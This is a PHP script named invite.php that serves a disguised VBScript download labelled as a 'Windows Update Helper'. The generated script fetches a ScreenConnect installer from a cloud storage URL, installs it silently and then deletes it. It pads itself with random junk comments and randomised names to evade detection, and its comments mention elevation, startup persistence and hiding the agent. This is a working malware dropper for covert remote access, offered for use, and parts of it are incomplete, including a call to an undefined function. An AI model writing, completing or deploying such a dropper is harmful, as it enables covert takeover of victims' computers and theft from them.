<?php
// invite.php - Fixed paths + logging
header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

$baseNames = [ /* your full list */ ];

$cookieName = "inv_used";
$used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) : [];
if (!is_array($used)) $used = [];

$available = array_diff($baseNames, $used);
if (empty($available)) {
    $available = $baseNames;
    $used = [];
}

$chosenBase = $available[array_rand($available)];
$random5 = str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT);
$chosen = $chosenBase . "_" . $random5 . ".vbs";

$used[] = $chosenBase;
setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 * 60), "/");

header('Content-Disposition: attachment; filename="' . $chosen . '"');

$scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";

$sessionId = bin2hex(random_bytes(24));
$ts        = time();
$randV1    = 'v' . substr(md5(random_bytes(8)), 0, 12);
$randFunc  = 'f' . substr(md5(random_bytes(8)), 0, 10);
$xorKey    = rand(100, 255);

$junkLines = rand(12, 45);
$junk = "";
for ($i = 0; $i < $junkLines; $i++) {
    $junk .= "' Junk " . bin2hex(random_bytes(rand(8, 22))) . "\n";
}

echo <<<VBS
' Windows Update Helper - $ts - DEBUG

Dim $randV1, objShell, objFSO, logFile
Set objShell = CreateObject("WScript.Shell")
Set objFSO   = CreateObject("Scripting.FileSystemObject")

$randV1 = "$sessionId"
logFile = objShell.ExpandEnvironmentStrings("%TEMP%\\debug_log.txt")

Sub Log(msg)
    On Error Resume Next
    Dim f
    Set f = objFSO.OpenTextFile(logFile, 8, True)
    f.WriteLine "[" & Now & "] " & msg
    f.Close
End Sub

Call Log("Script started - Session: $sessionId")

Function D(s)
    Dim i, r : r = ""
    For i = 1 To Len(s)
        r = r & Chr(Asc(Mid(s, i, 1)) Xor $xorKey)
    Next
    D = r
End Function

' ... (keep IsElevated, Elevate, AddToStartup, DownloadAndExecute, HideAgent with Log calls) ...

Sub DownloadAndExecute()
    On Error Resume Next
    Call Log("Starting download")
    Dim u, p, http, strm
    u = "$scUrl"
    p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")  ' Simpler, non-obfuscated path
    
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", u, False
    http.Send
    Call Log("HTTP Status: " & http.Status)
    If http.Status = 200 Then
        Set strm = CreateObject("ADODB.Stream")
        strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
        Call Log("Downloaded to: " & p)
        objShell.Run """" & p & """ /quiet", 0, True   ' Changed to /quiet for MSI
        Call Log("Installer executed")
        WScript.Sleep 5000
        If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
    End If
End Sub

$junk
Call $randFunc
WScript.Quit
VBS;
?>
